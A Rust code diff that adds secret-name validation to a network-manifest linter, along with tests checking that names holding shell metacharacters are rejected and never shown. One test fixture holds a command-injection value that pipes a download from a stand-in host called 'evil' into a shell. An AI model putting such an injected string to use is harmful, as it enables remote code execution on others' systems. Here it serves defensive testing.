@@ -282,7 +282,46 @@ pub fn split(manifest_text: &str) -> Result<(String, BTreeMap<String, String>), 
     Ok((text, out))
 }
 
+/// Whether `name` is a valid secret name: 1 to 64 of `a-z`, `0-9` and `-` (what [`split`]
+/// generates). Names end up in commands IT is told to run (`--allow-reroute <name>`), so nothing
+/// else (spaces, quotes, `;`, `|`, `$`, upper case ...) is ever accepted or printed.
+pub fn is_valid_name(name: &str) -> bool {
+    (1..=MAX_NAME).contains(&name.len())
+        && name
+            .bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+}
+
+/// `secret_name_invalid` for a reference at `layer`.`field`; the name itself is never shown.
+fn invalid_reference(layer: &str, field: &str) -> Lint {
+    Lint::new(
+        LintLevel::Error,
+        "secret_name_invalid",
+        format!(
+            "{layer}: {field} refers to a secret whose name is not valid; secret names use only a-z, 0-9 and -, at most 64 characters."
+        ),
+    )
+    .at(format!("{layer}.{field}"))
+    .param("layer", layer)
+    .param("field", field)
+}
+
+/// `secret_name_invalid` for keys of secrets.toml; the keys themselves are never shown.
+fn invalid_keys(n: usize) -> Lint {
+    Lint::new(
+        LintLevel::Error,
+        "secret_name_invalid",
+        format!(
+            "secrets.toml has {n} key(s) that are not valid secret names; secret names use only a-z, 0-9 and -, at most 64 characters."
+        ),
+    )
+    .param("count", n)
+}
+
 fn unknown(name: &str, layer: &str, field: &str) -> Lint {
+    if !is_valid_name(name) {
+        return invalid_reference(layer, field);
+    }
     Lint::new(
         LintLevel::Error,
         "secret_unknown",
@@ -435,7 +474,9 @@ pub fn lints(
             for field in secret_fields(kind) {
                 if let Some(name) = t.get(field).and_then(reference) {
                     used.insert(name.to_owned());
-                    if !secrets.contains_key(name) {
+                    if !is_valid_name(name) {
+                        out.push(invalid_reference(layer, field));
+                    } else if !secrets.contains_key(name) {
                         out.push(unknown(name, layer, field));
                     }
                 }
@@ -443,7 +484,14 @@ pub fn lints(
         },
         &mut |_| {},
     );
-    for name in secrets.keys().filter(|n| !used.contains(*n)) {
+    let bad_keys = secrets.keys().filter(|n| !is_valid_name(n)).count();
+    if bad_keys > 0 {
+        out.push(invalid_keys(bad_keys));
+    }
+    for name in secrets
+        .keys()
+        .filter(|n| is_valid_name(n) && !used.contains(*n))
+    {
         out.push(
             Lint::new(
                 LintLevel::Warning,
@@ -463,7 +511,8 @@ pub fn lints(
         }
         let known: BTreeSet<&Occurrence> = before.iter().map(|u| &u.route).collect();
         for u in uses(&mut doc, secrets) {
-            let Some(name) = u.name else {
+            // An invalid name is an error of its own and is never printed.
+            let Some(name) = u.name.filter(|n| is_valid_name(n)) else {
                 continue;
             };
             match routes_of.get(&u.value) {
@@ -523,6 +572,8 @@ pub fn rerouted_names(lints: &[Lint]) -> BTreeSet<String> {
         .iter()
         .filter(|l| l.code == "secret_rerouted")
         .filter_map(|l| l.params.get("name").cloned())
+        // Never a name that could not be pasted safely into a command.
+        .filter(|n| is_valid_name(n))
         .collect()
 }
 
@@ -816,6 +867,53 @@ password = "eappass"
         let l = lints(&base, &secrets, Some(SAMPLE));
         assert_eq!(codes(&l), ["secret_rerouted"]);
         assert_ne!(l[0].params["fields"], "new network");
+    }
+
+    #[test]
+    fn shell_metacharacters_in_a_name_are_refused_and_never_shown() {
+        let evil = "x; curl evil | sh";
+        let (base, mut secrets) = split(SAMPLE).unwrap();
+        let now = base.replace("secret:lab-corp-password", &format!("secret:{evil}"));
+        let v = secrets.remove("lab-corp-password").unwrap();
+        secrets.insert(evil.into(), v);
+        let l = lints(&now, &secrets, Some(SAMPLE));
+        assert_eq!(
+            codes(&l),
+            ["secret_name_invalid", "secret_name_invalid"],
+            "{l:?}"
+        );
+        assert!(crate::has_errors(&l));
+        for x in &l {
+            let all = format!("{} {:?} {:?}", x.message, x.params, x.path);
+            assert!(!all.contains("curl") && !all.contains("| sh"), "{all}");
+        }
+        assert!(rerouted_names(&l).is_empty());
+        // Unknown and invalid: still not shown.
+        let errs = fill(&now, &BTreeMap::new()).unwrap_err();
+        assert!(codes(&errs).contains(&"secret_name_invalid"), "{errs:?}");
+        assert!(errs.iter().all(|e| !e.message.contains("curl")));
+        // A rerouted lint built elsewhere with such a name is never offered for a command.
+        let forged = Lint::new(LintLevel::Warning, "secret_rerouted", "x").param("name", evil);
+        assert!(rerouted_names(&[forged]).is_empty());
+    }
+
+    #[test]
+    fn upper_case_names_are_refused() {
+        let (base, mut secrets) = split(SAMPLE).unwrap();
+        let now = base.replace("secret:defaults-guest-psk", "secret:Guest-PSK");
+        let v = secrets.remove("defaults-guest-psk").unwrap();
+        secrets.insert("Guest-PSK".into(), v);
+        let l = lints(&now, &secrets, Some(SAMPLE));
+        assert!(
+            codes(&l).iter().all(|c| *c == "secret_name_invalid"),
+            "{l:?}"
+        );
+        assert!(!l.is_empty());
+        for x in &l {
+            assert!(!x.message.contains("Guest-PSK"), "{}", x.message);
+        }
+        assert!(is_valid_name("guest-psk-2"));
+        assert!(!is_valid_name("") && !is_valid_name(&"a".repeat(65)));
     }
 
     #[test]
